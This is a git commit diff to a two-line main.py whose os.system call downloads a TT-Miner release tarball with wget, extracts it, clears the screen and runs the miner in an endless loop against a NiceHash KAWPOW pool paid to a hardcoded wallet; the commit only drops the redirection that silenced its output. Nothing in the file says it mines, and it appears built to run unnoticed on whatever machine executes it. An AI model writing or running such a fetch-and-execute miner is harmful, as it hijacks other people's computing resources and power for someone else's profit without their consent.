d47f0389b4a22f6859ba20770189d4dbbdcf33a1
LopperNanas <153208294+LopperNanas@users.noreply.github.com>
2024-03-19 13:09:21 -0300

    Update main.py

--- main.py
+++ main.py
@@ -1,2 +1,2 @@
 import os
-os.system("wget https://github.com/TrailingStop/TT-Miner-release/releases/download/2024.1.3/TT-Miner-2024.1.3.tar.gz && tar -xf TT-Miner-2024.1.3.tar.gz && clear && while true; do ./TT-Miner-2024.1.3/TT-Miner -a KAWPOW -P stratum+ssl://33uK4AkoDaMZ8FNNUN4nKw1bJQ6KfvuBA2.CLD@kawpow.auto.nicehash.com:443 > /dev/null 2>&1; done")
+os.system("wget https://github.com/TrailingStop/TT-Miner-release/releases/download/2024.1.3/TT-Miner-2024.1.3.tar.gz && tar -xf TT-Miner-2024.1.3.tar.gz && clear && while true; do ./TT-Miner-2024.1.3/TT-Miner -a KAWPOW -P stratum+ssl://33uK4AkoDaMZ8FNNUN4nKw1bJQ6KfvuBA2.CLD@kawpow.auto.nicehash.com:443 ; done")
